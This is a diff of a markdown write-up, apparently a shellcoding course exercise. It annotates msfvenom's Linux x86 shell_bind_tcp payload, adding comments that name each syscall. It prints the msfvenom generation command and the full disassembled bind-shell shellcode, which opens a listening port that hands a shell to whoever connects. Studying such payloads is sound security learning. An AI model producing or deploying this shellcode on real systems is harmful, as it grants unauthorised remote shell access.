@@ -16,13 +16,11 @@ Create a Shell_Bind_TCP shellcode that;
 
 A bind shell is a type of shell in which the system on which the code is run binds a TCP socket that is designated to listen for incoming connections to a specified port and IP address. When a bind shell is used, the system on which the bind shell is executed acts as the listener. When a connection is accepted on the bound and listening socket on the designated port and IP address, a shell will be spawned on the system on which the code is run. 
 
-While analyzing shell_bind_tcp shellcode produced by msfvenom, it appears that a total of six syscalls are executed in sequential order. The order goes: socket, bind, listen, accept, dup2, and execve. Each serve a purpose in creating a bind shell. Let's analyze the first function in this payload. 
+While analyzing shell_bind_tcp shellcode produced by msfvenom, it appears that a total of six syscalls are executed in sequential order. The order goes: `socket`, `bind`, `listen`, `accept`, `dup2`, and execve. Each serve a purpose in creating a bind shell. Let's analyze the first function in this payload. 
 
-`msfvenom -p linux/x86/shell_bind_tcp -f raw| ndisasm -u -` produces
+`msfvenom -p linux/x86/shell_bind_tcp -f raw| ndisasm -u -` produces a payload the size of 78 bytes:
 
 ```
-Payload size: 78 bytes
-
 xor ebx,ebx  
 mul ebx  
 push ebx  
@@ -31,7 +29,7 @@ push ebx
 push byte +0x2 
 mov ecx,esp  
 mov al,0x66  
-int 0x80  
+int 0x80 ; socket 
 pop ebx  
 pop esi  
 push edx  
@@ -42,19 +40,19 @@ push eax
 mov ecx,esp  
 push byte +0x66 
 pop eax  
-int 0x80  
+int 0x80 ; bind
 mov [ecx+0x4],eax  
 mov bl,0x4  
 mov al,0x66  
-int 0x80  
+int 0x80 ; listen
 inc ebx  
 mov al,0x66  
-int 0x80  
+int 0x80 ; accept
 xchg eax,ebx  
 pop ecx  
 push byte +0x3f 
 pop eax  
-int 0x80  
+int 0x80 ; dup2
 dec ecx  
 jns 0x32  
 push dword 0x68732f2f 
@@ -64,7 +62,7 @@ push eax
 push ebx  
 mov ecx,esp  
 mov al,0xb  
-int 0x80
+int 0x80 ; execve
 ```
 
 The socket or SYS_SOCKETCALL is syscall number 102 or 0x66.
